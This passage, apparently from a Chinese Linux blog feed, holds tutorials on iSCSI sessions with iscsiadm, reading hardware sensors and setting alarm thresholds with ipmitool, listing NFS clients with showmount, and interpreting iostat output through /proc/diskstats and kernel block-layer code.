-lLogging in to [iface: default, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260]Login to [iface: default, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260]: successful 登录之后，可以用iscsiadm -m session查看。结果一般如下所示：12root@node-242:~# iscsiadm -m session tcp: [3] 10.16.172.246:3260,1 iqn.2018-11.com:BEAN 登出指定target1iscsiadm -m node -T [target_name] -p [ip:3260] -u 具体指令如下所示：123root@node:~# iscsiadm -m node -T iqn.2018-11.com:BEAN -p 10.16.172.246:3260 -uLogging out of session [sid: 3, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260]Logout of [sid: 3, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260]: successful 登出之后，可以用iscsiadm -m session 检查效果。12root@node-242:~# iscsiadm -m session iscsiadm: No active sessions. 信息一般来讲，登录target之后会新增一个盘符，登录之前，lsblk输出如下：123456789101112root@node:~# lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTsda 8:0 0 30G 0 disk ├─sda1 8:1 0 7M 0 part ├─sda2 8:2 0 22.2G 0 part /├─sda3 8:3 0 7.5G 0 part [SWAP]└─sda4 8:4 0 261M 0 part sdb 8:16 0 100G 0 disk ├─sdb1 8:17 0 8G 0 part └─sdb2 8:18 0 92G 0 part /data/osd.2sdc 8:32 0 2T 0 disk sr0 11:0 1 1024M 0 rom 执行登录target之后：123456789101112131415root@node:~# iscsiadm -m node -T iqn.2018-11.com:BEAN -p 10.16.172.246:3260 -lLogging in to [iface: default, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260] (multiple)Login to [iface: default, target: iqn.2018-11.com:BEAN, portal: 10.16.172.246,3260] successful.root@node2:~# lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTsda 8:0 0 30G 0 disk ├─sda1 8:1 0 7M 0 part ├─sda2 8:2 0 22.2G 0 part /├─sda3 8:3 0 7.5G 0 part [SWAP]└─sda4 8:4 0 261M 0 part sdb 8:16 0 100G 0 disk ├─sdb1 8:17 0 8G 0 part └─sdb2 8:18 0 92G 0 part /data/osd.2sdc 8:32 0 2T 0 disk sr0 11:0 1 1024M 0 rom 我们可以看到新增了一个sdc。 如果确定sdc和iSCSI target的关系呢:1iscsiadm -m session -P 3 比如之前的输出, sde这块磁盘即iSCSI，来自 10.16.172.247:3260的Target: iqn.2018-11.com:BEAN12345678910111213141516171819202122232425262728293031323334353637root@node:~# iscsiadm -m session -P 3iSCSI Transport Class version 2.0-870version 2.0-871Target: iqn.2018-11.com:BEAN Current Portal: 10.16.172.247:3260,1 Persistent Portal: 10.16.172.247:3260,1 ********** Interface: ********** Iface Name: default Iface Transport: tcp Iface Initiatorname: iqn.1993-08.org.debian:01:c9c12dd76e Iface IPaddress: 10.16.172.242 Iface HWaddress: (null) Iface Netdev: (null) SID: 2 iSCSI Connection State: LOGGED IN iSCSI Session State: LOGGED_IN Internal iscsid Session State: NO CHANGE ************************ Negotiated iSCSI params: ************************ HeaderDigest: None DataDigest: None MaxRecvDataSegmentLength: 262144 MaxXmitDataSegmentLength: 1048576 FirstBurstLength: 262144 MaxBurstLength: 1048576 ImmediateData: Yes InitialR2T: No MaxOutstandingR2T: 1 ************************ Attached SCSI devices: ************************ Host Number: 25 State: running scsi25 Channel 00 Id 0 Lun: 0 Attached scsi disk sde State: running document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i通过ipmitool获取各元件的温度信息和检查电源模块状态]]></title>
    <url>%2F2019%2F03%2F11%2Fipmitool%2F</url>
    <content type="text"><![CDATA[前言ipmitool可以获取各个元件的温度信息，如何判断各个组件的温度信息，各个组件的温度信息是否OK，有没有温度过高或者过低的元件需要告警？获取各个元件温度的方法我们可以通过如下指令获取所有元件的温度信息和相关的状态123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657root@node:~# ipmitool sensor list CPU1 Temp | 29.000 | degrees C | ok | 0.000 | 0.000 | 0.000 | 85.000 | 90.000 | 90.000 CPU2 Temp | 33.000 | degrees C | nr | 10.000 | 10.000 | 10.000 | 30.000 | 30.000 | 30.000 PCH Temp | 32.000 | degrees C | ok | 0.000 | 5.000 | 16.000 | 90.000 | 95.000 | 100.000 System Temp | 30.000 | degrees C | ok | -10.000 | -5.000 | 0.000 | 80.000 | 85.000 | 90.000 Peripheral Temp | 34.000 | degrees C | ok | -10.000 | -5.000 | 0.000 | 80.000 | 85.000 | 90.000 Vcpu1VRM Temp | 28.000 | degrees C | ok | -5.000 | 0.000 | 5.000 | 95.000 | 100.000 | 105.000 Vcpu2VRM Temp | 34.000 | degrees C | ok | -5.000 | 0.000 | 5.000 | 95.000 | 100.000 | 105.000 VmemABVRM Temp | 29.000 | degrees C | ok | -5.000 | 0.000 | 5.000 | 95.000 | 100.000 | 105.000 VmemCDVRM Temp | 28.000 | degrees C | ok | -5.000 | 0.000 | 5.000 | 95.000 | 100.000 | 105.000 VmemEFVRM Temp | 31.000 | degrees C | ok | -5.000 | 0.000 | 5.000 | 95.000 | 100.000 | 105.000 VmemGHVRM Temp | 30.000 | degrees C | ok | -5.000 | 0.000 | 5.000 | 95.000 | 100.000 | 105.000 P1-DIMMA1 Temp | 27.000 | degrees C | ok | -5.000 | 0.000 | 5.000 | 80.000 | 85.000 | 90.000 P1-DIMMA2 Temp | na | | na | na | na | na | na | na | na P1-DIMMB1 Temp | 27.000 | degrees C | ok | -5.000 | 0.000 | 5.000 | 80.000 | 85.000 | 90.000 P1-DIMMB2 Temp | na | | na | na | na | na | na | na | na P1-DIMMC1 Temp | na | | na | na | na | na | na | na | na P1-DIMMC2 Temp | na | | na | na | na | na | na | na | na P1-DIMMD1 Temp | na | | na | na | na | na | na | na | na P1-DIMMD2 Temp | na | | na | na | na | na | na | na | na P2-DIMME1 Temp | 29.000 | degrees C | ok | -5.000 | 0.000 | 5.000 | 80.000 | 85.000 | 90.000 P2-DIMME2 Temp | na | | na | na | na | na | na | na | na P2-DIMMF1 Temp | 30.000 | degrees C | ok | -5.000 | 0.000 | 5.000 | 80.000 | 85.000 | 90.000 P2-DIMMF2 Temp | na | | na | na | na | na | na | na | na P2-DIMMG1 Temp | na | | na | na | na | na | na | na | na P2-DIMMG2 Temp | na | | na | na | na | na | na | na | na P2-DIMMH1 Temp | na | | na | na | na | na | na | na | na P2-DIMMH2 Temp | na | | na | na | na | na | na | na | na FAN1 | 4400.000 | RPM | ok | 300.000 | 500.000 | 700.000 | 25300.000 | 25400.000 | 25500.000 FAN2 | 4300.000 | RPM | ok | 300.000 | 500.000 | 700.000 | 25300.000 | 25400.000 | 25500.000 FAN3 | 4400.000 | RPM | ok | 300.000 | 500.000 | 700.000 | 25300.000 | 25400.000 | 25500.000 FAN4 | na | | na | na | na | na | na | na | na FAN5 | na | | na | na | na | na | na | na | na FAN6 | na | | na | na | na | na | na | na | na FANA | 4400.000 | RPM | ok | 300.000 | 500.000 | 700.000 | 25300.000 | 25400.000 | 25500.000 FANB | na | | na | na | na | na | na | na | na 12V | 12.315 | Volts | ok | 10.173 | 10.299 | 10.740 | 12.945 | 13.260 | 13.386 5VCC | 5.000 | Volts | ok | 4.246 | 4.298 | 4.480 | 5.390 | 5.546 | 5.598 3.3VCC | 3.316 | Volts | ok | 2.789 | 2.823 | 2.959 | 3.554 | 3.656 | 3.690 VBAT | 3.104 | Volts | ok | 2.376 | 2.480 | 2.584 | 3.494 | 3.598 | 3.676 Vcpu1 | 1.800 | Volts | ok | 1.242 | 1.260 | 1.395 | 1.899 | 2.088 | 2.106 Vcpu2 | 1.809 | Volts | ok | 1.242 | 1.260 | 1.395 | 1.899 | 2.088 | 2.106 VDIMMAB | 1.200 | Volts | ok | 0.948 | 0.975 | 1.047 | 1.344 | 1.425 | 1.443 VDIMMCD | 1.209 | Volts | ok | 0.948 | 0.975 | 1.047 | 1.344 | 1.425 | 1.443 VDIMMEF | 1.209 | Volts | ok | 0.948 | 0.975 | 1.047 | 1.344 | 1.425 | 1.443 VDIMMGH | 1.209 | Volts | ok | 0.948 | 0.975 | 1.047 | 1.344 | 1.425 | 1.443 5VSB | 4.974 | Volts | ok | 4.246 | 4.298 | 4.480 | 5.390 | 5.546 | 5.598 3.3VSB | 3.316 | Volts | ok | 2.789 | 2.823 | 2.959 | 3.554 | 3.656 | 3.690 1.5V PCH | 1.509 | Volts | ok | 1.320 | 1.347 | 1.401 | 1.644 | 1.671 | 1.698 1.2V BMC | 1.209 | Volts | ok | 1.020 | 1.047 | 1.092 | 1.344 | 1.371 | 1.398 1.05V PCH | 1.050 | Volts | ok | 0.870 | 0.897 | 0.942 | 1.194 | 1.221 | 1.248 Chassis Intru | 0x0 | discrete | 0x0000| na | na | na | na | na | na PS1 Status | 0x1 | discrete | 0x0100| na | na | na | na | na | na PS2 Status | 0x1 | discrete | 0x0100| na | na | na | na | na | na AOC_SAS Temp | 60.000 | degrees C | ok | -11.000 | -8.000 | -5.000 | 100.000 | 105.000 | 110.000 HDD Temp | 29.000 | degrees C | ok | -11.000 | -8.000 | -5.000 | 50.000 | 55.000 | 60.000 HDD Status | 0x1 | discrete | 0x01ff| na | na | na | na | na | na 一般来讲，第三列的值中有degree的，我们统计的是温度信息。 第一列： 传感器的名称，比如CPU1 Temp， 第二列: 该元件的当前温度值，注意有时候会是na，即取不到。 第四列： 温度的状态信息，ok表示温度正常，有时候该状态值为nr，为non-recovery，不可恢复的意思 一般来讲，常见的温度状态有以下5种： ok：温度正常 nc： non-critical，温度偏高（或者偏低），但是并不太严重 cr：critical，温度太高或者温度太低，很严重 nr： non-recovery，温度太高或者温度太低，造成不可恢复的损伤。 na：温度状态不明，比较少见。 注意ok –> nc –> cr –> nr 从正常，到越来越严重的温度问题。 如何触发温度告警介绍了nc cr 和nr三种状态，都说温度偏高或者温度偏低，那么 温度到什么程度状态会变成nc， 温度到什么程度会变成cr 温度到什么程度会变成nr 显然，各个元件的状态改变是有温度门限值的，我们可以通过如下方法查看：123456789101112131415161718192021222324252627root@node:~# ipmitool sensor get "CPU1 Temp"Locating sensor record...Sensor ID : CPU1 Temp (0x1) Entity ID : 3.1 (Processor) Sensor Type (Threshold) : Temperature (0x01) Sensor Reading : 29 (+/- 0) degrees C Status : ok Nominal Reading : 40.000 Normal Minimum : -4.000 Normal Maximum : 89.000 Upper non-recoverable : 90.000 Upper critical : 90.000 Upper non-critical : 85.000 Lower non-recoverable : 0.000 Lower critical : 0.000 Lower non-critical : 0.000 Positive Hysteresis : 2.000 Negative Hysteresis : 2.000 Minimum sensor range : Unspecified Maximum sensor range : Unspecified Event Message Control : Per-threshold Readable Thresholds : lnr lcr lnc unc ucr unr Settable Thresholds : lnr lcr lnc unc ucr unr Threshold Read Mask : lnr lcr lnc unc ucr unr Assertion Events : Assertions Enabled : ucr+ Deassertions Enabled : ucr+ 从上面的信息可以看出： Upper non-critical 85 度 Upper critical 90 度 Upper non-recovery 90 度 Lower non-critical 0 度 Lower critical 0 度 Lower non-recoverable 有了门限值，是哪种状态就比较简单了。 [0,85]之间是，状态ok [85,90] 状态为nc [90,] 状态为nr （因为cr的门限和nr的门限都是90，状态取nr） 低温的情况也是类似。 如何让温度状态告警呢，即变成nc或者cr或者nr状态呢？ ipmitool提供了方法来设置各个状态的门限值。1ipmitool -I open sensor thresh 'CPU2 Temp' upper 20 30 90 上述指令的意思是将CPU2 Temp元件的告警门限中的温度上限告警门限设置为20 30 和90. 以为CPU的温度是33度左右，我们可以通过如下指令，将状态变为nc：12345root@node:~# ipmitool -I open sensor thresh 'CPU2 Temp' upper 20 40 90Locating sensor record 'CPU2 Temp'...Setting sensor "CPU2 Temp" Upper Non-Critical threshold to 20.000Setting sensor "CPU2 Temp" Upper Critical threshold to 40.000Setting sensor "CPU2 Temp" Upper Non-Recoverable threshold to 90.000 12root@node:~# ipmitool sensor listCPU2 Temp | 33.000 | degrees C | nc | 10.000 | 10.000 | 10.000 | 20.000 | 40.000 | 90.000 33摄氏度，超过了20度，但是没要超过40度，因此状态是nc，即non-critical。 同样道理，我们将告警门限设置为 20 30 90的话，就会发现状态为cr，即critical：123456789root@node:~# ipmitool -I open sensor thresh 'CPU2 Temp' upper 20 30 90Locating sensor record 'CPU2 Temp'...Setting sensor "CPU2 Temp" Upper Non-Critical threshold to 20.000Setting sensor "CPU2 Temp" Upper Critical threshold to 30.000Setting sensor "CPU2 Temp" Upper Non-Recoverable threshold to 90.000root@node:~# ipmitool sensor list CPU1 Temp | 30.000 | degrees C | ok | 0.000 | 0.000 | 0.000 | 85.000 | 90.000 | 90.000 CPU2 Temp | 33.000 | degrees C | cr | 10.000 | 10.000 | 10.000 | 20.000 | 30.000 | 90.000 同样道理，可以将状态变成nr，只需要设置门限为20 30 30 ，即可。 检查电源模块状态我们知道IPMI很强大，如何利用ipmitool获取到电源的实施状态的。现代的服务器，基本上都有两个电源模块，作为冗余。如何查看电源的状态信息呢，是否所有的电源模块都已启用，电源是否都通电？ 方法一通过如下指令可以获取到电源的状态信息：1ipmitool sdr type "power supply" 正常情况下电源的状态如下所示12PS1 Status | C4h | ok | 10.1 | Presence detectedPS2 Status | C5h | ok | 10.2 | Presence detected 如果，我们将其中一个拔掉电源插头，状态就会如下所示：12PS1 Status | C4h | ok | 10.1 | Presence detectedPS2 Status | C5h | ok | 10.2 | Presence detected, Failure detected, Power Supply AC lost 如果我们将其中一个的电源模块(PSU, power supply unit)直接从服务器上拔出，状态就会如下所示：12PS1 Status | C4h | ok | 10.1 | Presence detectedPS2 Status | C5h | ok | 10.2 | 事实上除了上面的几种，我们可以通过1ipmitool sensor get "PS1 Status" 查看其他可能的值123456789101112131415161718192021222324Sensor ID : PS1 Status (0xc4)Entity ID : 10.1 (Power Supply)Sensor Type (Discrete): Power Supply (0x08)Sensor Reading : 1h { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谁连了我的NFS目录]]></title>
    <url>%2F2019%2F03%2F11%2Fshowmount%2F</url>
    <content type="text"><![CDATA[前言有些时候，作为NFS Server，需要了解哪些client端连了我的NFS 目录，这时候，showmount命令就闪亮登场了。 使用方法showmount -a 可以查看，当前到底有哪些client连接了本Server exports的目录12345678910root@node # showmount -a All mount points on Storage-b3:10.1.226.105:/var/share/ezfs/shareroot/mgt10.1.227.1:/var/share/ezfs/shareroot/backup10.1.227.201:/var/share/ezfs/shareroot/mgt10.1.227.2:/var/share/ezfs/shareroot/backup10.1.227.3:/var/share/ezfs/shareroot/backup10.1.227.81:/var/share/ezfs/shareroot/mgt10.1.227.85:/var/share/ezfs/shareroot/mgt10.1.232.199:/var/share/ezfs/shareroot/mgt 尾声showmount是一个比较综合的命令，还有很多其它的用法。可以通过man 查看。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解iostat]]></title>
    <url>%2F2019%2F03%2F11%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3iostat%2F</url>
    <content type="text"><![CDATA[前言iostat算是比较重要的查看块设备运行状态的工具，相信大多数使用Linux的同学都用过这个工具，或者听说过这个工具。但是对于这个工具，引起的误解也是最多的，大多数人对这个工具处于朦朦胧胧的状态。现在我们由浅到深地介绍这个工具，它输出的含义什么，介绍它的能力边界，介绍关于这个工具的常见误解。基本用法和输出的基本含义iostat的用法比较简单，一般来说用法如下：1iostat -mtx 2 含义是说，每2秒钟采集一组数据：123-m Display statistics in megabytes per second.-t Print the time for each report displayed. The timestamp format may depend on the value of the S_TIME_FORMAT environment variable (see below).-x Display extended statistics. 输出的结果如下所示： 注意，上图是在对sdc这块单盘（RAID卡上的单盘）做4KB的随机写入测试：1fio --name=randwrite --rw=randwrite --bs=4k --size=20G --runtime=1200 --ioengine=libaio --iodepth=64 --numjobs=1 --rate_iops=5000 --filename=/dev/sdf --direct=1 --group_reporting 因此上图中只有sdc在忙。如何阅读iostat的输出，各个参数都是什么含义，反映了磁盘的什么信息？第一列Device比较容易理解，就是说这一行描述的是哪一个设备。 rrqm/s : 每秒合并读操作的次数 wrqm/s: 每秒合并写操作的次数 r/s ： 每秒读操作的次数 w/s : 每秒写操作的次数 rMB/s : 每秒读取的MB字节数 wMB/s: 每秒写入的MB字节数 avgrq-sz： 每个IO的平均扇区数，即所有请求的平均大小，以扇区（512字节）为单位 avgqu-sz： 平均为完成的IO请求数量，即平均意义山的请求队列长度 await： 平均每个IO所需要的时间，包括在队列等待的时间，也包括磁盘控制器处理本次请求的有效时间。 r_wait： 每个读操作平均所需要的时间，不仅包括硬盘设备读操作的时间，也包括在内核队列中的时间。 w_wait: 每个写操平均所需要的时间，不仅包括硬盘设备写操作的时间，也包括在队列中等待的时间。 svctm： 表面看是每个IO请求的服务时间，不包括等待时间，但是实际上，这个指标已经废弃。实际上，iostat工具没有任何一输出项表示的是硬盘设备平均每次IO的时间。 %util： 工作时间或者繁忙时间占总时间的百分比 avgqu-sz 和繁忙程度首先我们用超市购物来比对iostat的输出。我们在超市结账的时候，一般会有很多队可以排，队列的长度，在一定程度上反应了该收银柜台的繁忙程度。那么这个变量是avgqu-sz这个输出反应的，该值越大，表示排队等待处理的io越多。 我们搞4K的随机IO，但是iodepth=1 ，查看下fio的指令和iostat的输出：1fio --name=randwrite --rw=randwrite --bs=4k --size=20G --runtime=1200 --ioengine=libaio --iodepth=1 --numjobs=1 --filename=/dev/sdc --direct=1 --group_reporting 同样是4K的随机IO，我们设置iodepth=16， 查看fio的指令和iostat的输出：1fio --name=randwrite --rw=randwrite --bs=4k --size=20G --runtime=1200 --ioengine=libaio --iodepth=16 --numjobs=1 --filename=/dev/sdc --direct=1 --group_reporting 注意 sdc的avgrq-sz这列的值，变成了256，即256 个扇区 = 256* 512 Byte = 128KB，等于我们fio测试时，下达的bs = 128k。注意，这个值也不是为所欲为的，它受内核参数的控制：123root@node1:~# cat /sys/block/sdc/queue/max_sectors_kb 256#这个值不是最大下发的IO是256KB，即512个扇区。当我们fio对sdc这块盘做测试的时候，如果bs=256k，iostat输出中的avgrq-sz 会变成 512 扇区，但是，如果继续增大bs，比如bs=512k，那么iostat输出中的avgrq-sz不会继续增大，仍然是512，表示512扇区。 1fio --name=randwrite --rw=randwrite --bs=512k --size=20G --runtime=1200 --ioengine=libaio --iodepth=1 --numjobs=1 --filename=/dev/sdc --direct=1 --group_reporting 注意，本来512KB等于1024个扇区，avgrq-sz应该为1204，但是由于内核的max_sectors_kb控制参数，决定了不可能：另外一个需要注意也不难理解的现象是，io请求越大，需要消耗的时间就会越长。对于块设备而言，时间分成2个部分： 寻道 读或写操作注意此处的寻道不能简单地理解成磁盘磁头旋转到指定位置，因为后备块设备可能是RAID，可能是SSD，我们理解写入前的准备动作。准备工作完成之后，写入4K和写入128KB，明显写入128KB的工作量要更大一些，因此很容易理解随机写入128KB给块设备带来的负载要比随机写入4K给块设备带来的负载要高一些。 对比生活中的例子，超时排队的时候，你会首先查看队列的长度来评估下时间，如果队列都差不多长的情况下，你就要关心前面顾客篮子里东西的多少了。如果前面顾客每人手里拿着一两件商品，另一队几乎每一个人都推这满满一车子的商品，你可能知道要排那一队。因为商品越多，处理单个顾客的时间就会越久。IO也是如此。 rrqm/s 和wrqm/s块设备有相应的调度算法。如果两个IO发生在相邻的数据块时，他们可以合并成1个IO。 这个简单的可以理解为快递员要给一个18层的公司所有员工送快递，每一层都有一些包裹，对于快递员来说，最好的办法是同一楼层相近的位置的包裹一起投递，否则如果不采用这种算法，采用最原始的来一个送一个（即noop算法），那么这个快递员，可能先送了一个包括到18层，又不得不跑到2层送另一个包裹，然后有不得不跑到16层送第三个包裹，然后包到1层送第三个包裹，那么快递员的轨迹是杂乱无章的，也是非常低效的。 Linux常见的调度算法有: noop deadline cfq 12root@node:~# cat /sys/block/sdc/queue/scheduler [noop] deadline cfq 类比总结我们还是以超时购物为例，比如一家三口去购物，各人买各人的东西，最终会汇总到收银台，你固然可以每人各自付各自的，但是也可以汇总一下，把所有购买的东西放在一起，由一个人来完成，也就说，三次收银事件merge成了一次。 至此，我们以超时购物收银为例，介绍了avgqu-sz 类比于队伍的长度，avgrq-sz 类比于每个人购物车里物品的多少，rrqm/s和wrqm/s 类比于将一家购得东西汇总一起，付费一次。还有svctm和%util两个没有介绍。 按照我们的剧情，我们自然而然地可以将svctm类比成收银服务员服务每个客户需要的平均时间，%util类比成收银服务员工作的繁忙程度。 注意这个类比是错误的，就是因为类似的类比，容易让人陷入误区不能自拔。不能简单地将svctm理解成单个IO被块设备处理的有效时间，同时不能理解成%util到了100% ，磁盘工作就饱和了，不能继续提升了，这是两个常见的误区。 svctm和%util是iostat最容易引起误解的两个输出。为了准确地评估块设备的能力，我们希望得到这样一个数值：即一个io从发给块设备层到完成这个io的时间，不包括其他在队列等待的时间。从表面看，svctm就是这个值。实际上并非如此。 Linux下iostat输出的svctm并不具备这方面的含义，这个指标应该非废弃。iostat和sar的man page都有这方面的警告：12svctmThe average service time (in milliseconds) for I/O requests that were issued to the device. Warning! Do not trust this field any more. This field will be removed in a future sysstat version. 那么iostat输出中的svctm到底是怎么来的，%util又是怎么算出来的，进而iostat的输出的各个字段都是从哪里拿到的信息呢？ iostat输出的数据来源diskstatsiostat数据的来源是 Linux 操作系统的 /proc/diskstats 注意，procfs中的前三个字段：主设备号、从设备号、设备名。从第四个字段开始，介绍的是该设备的相关统计： (rd_ios) : 读操作的次数 (rd_merges):合并读操作的次数。如果两个读操作读取相邻的数据块，那么可以被合并成1个。 (rd_sectors): 读取的扇区数量 (rd_ticks):读操作消耗的时间（以毫秒为单位）。每个读操作从__make_request()开始计时，到end_that_request_last()为止，包括了在队列中等待的时间。 (wr_ios):写操作的次数 (wr_merges):合并写操作的次数 (wr_sectors): 写入的扇区数量 (wr_ticks): 写操作消耗的时间（以毫秒为单位） (in_flight): 当前未完成的I/O数量。在I/O请求进入队列时该值加1，在I/O结束时该值减1。 注意：是I/O请求进入队列时，而不是提交给硬盘设备时 (io_ticks)该设备用于处理I/O的自然时间(wall-clock time) (time_in_queue): 对字段#10(io_ticks)的加权值 这些字段大多来自内核的如下数据：123456789include/linux/genhd.hstruct disk_stats { unsigned long sectors[2]; /* READs and WRITEs */ unsigned long ios[2]; unsigned long merges[2]; unsigned long ticks[2]; unsigned long io_ticks; unsigned long time_in_queue;}; 除了in_flight来自：12345part_in_flight(hd), static inline int part_in_flight(struct hd_struct *part){ return atomic_read(&part->in_flight[0]) + atomic_read(&part->in_flight[1]);} 内核相关的代码如下：1234567891011121314151617181920while ((hd = disk_part_iter_next(&piter))) { cpu = part_stat_lock(); part_round_stats(cpu, hd); part_stat_unlock(); seq_printf(seqf, "%4d %7d %s %lu %lu %llu " "%u %lu %lu %llu %u %u %u %u\n", MAJOR(part_devt(hd)), MINOR(part_devt(hd)), disk_name(gp, hd->partno, buf), part_stat_read(hd, ios[READ]), part_stat_read(hd, merges[READ]), (unsigned long long)part_stat_read(hd, sectors[READ]), jiffies_to_msecs(part_stat_read(hd, ticks[READ])), part_stat_read(hd, ios[WRITE]), part_stat_read(hd, merges[WRITE]), (unsigned long long)part_stat_read(hd, sectors[WRITE]), jiffies_to_msecs(part_stat_read(hd, ticks[WRITE])), part_in_flight(hd), jiffies_to_msecs(part_stat_read(hd, io_ticks)), jiffies_to_msecs(part_stat_read(hd, time_in_queue)) ); io_ticks and time_in_queue这里面大部分字段都是很容易理解的，稍微难理解的在于io_ticks。初看之下，明明已经有了rd_ticks和wr_ticks 为什么还需一个io_ticks。注意rd_ticks和wr_ticks是把每一个IO消耗时间累加起来，但是硬盘设备一般可以并行处理多个IO，因此，rd_ticks和wr_ticks之和一般会比自然时间（wall-clock time）要大。而io_ticks 不关心队列中有多少个IO在排队，它只关心设备有IO的时间。即不考虑IO有多少，只考虑IO有没有。在实际运算中，in_flight不是0的时候保持计时，而in_flight 等于0的时候，时间不累加到io_ticks。 下一个比较难理解的是time_in_queue这个值，它的计算是当前IO数量（即in_flight的值）乘以自然时间间隔。表面看该变量的名字叫time_in_queue，但是实际上，并不只是在队列中等待的时间。 有人不理解time_in_queue，但是我相信读过小学 听过下面这句话的小朋友都会理解time_in_queue： 因为你上课讲话， 让老师批评你5分钟，班里有50人，50个人你就浪费了全班250分钟。 这段话非常形象地介绍了time_in_queue的计算法则，即自然时间只过去了5分钟，但是对于队列中的所有同学，哦不，所有IO来说，需要加权计算：123456789101112131415161718static void part_round_stats_single(int cpu, struct hd_struct *part, unsigned long now){ if (now == part->stamp) return; /*如果队列不为空，存在in_flight io*/ if (part_in_flight(part)) { /*小学数学老师的算法，now-part->stamp 乘以班级人数，哦不，是乘以队列中等待的io请求个数*/ __part_stat_add(cpu, part, time_in_queue, part_in_flight(part) * (now - part->stamp)); /*如实的记录，因为批评调皮学生，浪费了5分钟。io不是空的时间增加now - part->stamp*/ __part_stat_add(cpu, part, io_ticks, (now - part->stamp)); } part->stamp = now;} 这个计算的方法很简单： 当请求队列为空的时候 io_ticks不增加 time_in_queue不增加 part->stamp 更新为now 当请求队列不是空的时候 io_ticks增加， 增加量为 now - part->timestamp time_in_queue增加，增加量为 在队列中IO的个数乘以 (now - part->stamp) part->stamp 更新为now 注意调用part_round_stats_single函数的时机在于 在新IO请求插入队列（被merge的不算） 完成一个IO请求 空说太过抽象，但是我们还是给出一个例子来介绍io_ticks和time_in_queue的计算 ID Time Ops in_flight stamp stamp_delta io_ticks time_in_queue 0 100 新请求入队列 0 0 无需计算 0 0 1 100.10 新请求入队列 1 100 100.10-100 = 0.1 0.1 0.1 2 101.20 完成一个IO请求 2 100.10 101.20-100.10 = 1.1 1.2 0.1+1.1*2 = 2.3 3 103.60 完成一个IO请求 1 101.20 103.60-101.20 = 2.4 3.6 2.3+2.4*1=4.7 4 153.60 新请求入队列 0 103.60 无需计算 3.6 4.7 5 153.90 完成一个IO请求 1 153.60 153.90 - 153.60 = 0.3 3.9 4.7+0.3 * 1= 5 注意上面总时间是53.90时间内，有3.9秒的自然时间内是有IO的，即IO队列的非空时间为3.9秒。 注意，io_ticks这个字段被iostat用来计算%util，而time_in_queue这个字段被iostat用来计算avgqu-sz，即平均队列长度。 其实不难理解了，队列中不为空的时候占总时间的比例即为 %util /proc/diskstats中其他数据项的更新既然我们介绍了io_ticks和time_in_queue，我们也简单介绍下其他字段的获取。在每个IO结束后，都会调用blk_account_io_done函数，这个函数会负责更新rd_ios/wr_ios、rd_ticks/wr_ticks ,包括会更新in_flight。123456789101112131415161718192021222324252627282930313233343536373839404142void blk_account_io_done(struct request *req){ /* * Account IO completion. flush_rq isn't accounted as a * normal IO on queueing nor completion. Accounting the * containing request is enough. */ if (blk_do_io_stat(req) && !(req->rq_flags & RQF_FLUSH_SEQ)) { unsigned long duration = jiffies - req->start_time; /*从req获取请求类型：R / W*/ const int rw = rq_data_dir(req); struct hd_struct *part; int cpu; cpu = part_stat_lock(); part = req->part; /*更新读或写次数，自加*/ part_stat_inc(cpu, part, ios[rw]); /*将io的存活时间，更新到rd_ticks or wr_ticks*/ part_stat_add(cpu, part, ticks[rw], duration); /*更新io_ticks和time_in_queue*/ part_round_stats(cpu, part); /*对应infight 减 1 */ part_dec_in_flight(part, rw); hd_struct_put(part); part_stat_unlock(); } }``` ##### 注意part_round_stats会调用上一小节介绍的part_round_stats_single函数：```cgovoid part_round_stats(int cpu, struct hd_struct *part){ /*既要更新分区的统计，也要更新整个块设备的统计*/ unsigned long now = jiffies; if (part->partno) part_round_stats_single(cpu, &part_to_disk(part)->part0, now); part_round_stats_single(cpu, part, now);} 读写扇区的个数统计，是在blk_account_io_completion函数中实现的：12345678910111213void blk_account_io_completion(struct request *req, unsigned int bytes) { if (blk_do_io_stat(req)) { const int rw = rq_data_dir(req); struct hd_struct *part; int cpu; cpu = part_stat_lock(); part = req->part; /*右移9位，相当于除以512字节，即一个扇区的字节数*/ part_stat_add(cpu, part, sectors[rw], bytes >> 9); part_stat_unlock(); } } 关于merge部分的统计，在blk_account_io_start函数中统计：123456789101112131415161718192021222324252627282930void blk_account_io_start(struct request *rq, bool new_io){ struct hd_struct *part; int rw = rq_data_dir(rq); int cpu; if (!blk_do_io_stat(rq)) return; cpu = part_stat_lock(); if (!new_io) { /*注意，merge的IO就不会导致in_flight++*/ part = rq->part; part_stat_inc(cpu, part, merges[rw]); } else { part = disk_map_sector_rcu(rq->rq_disk, blk_rq_pos(rq)); if (!hd_struct_try_get(part)) { part = &rq->rq_disk->part0; hd_struct_get(part); } /*新IO，更新io_ticks and time_in_queue*/ part_round_stats(cpu, part); /*in_flight 加1*/ part_inc_in_flight(part, rw); rq->part = 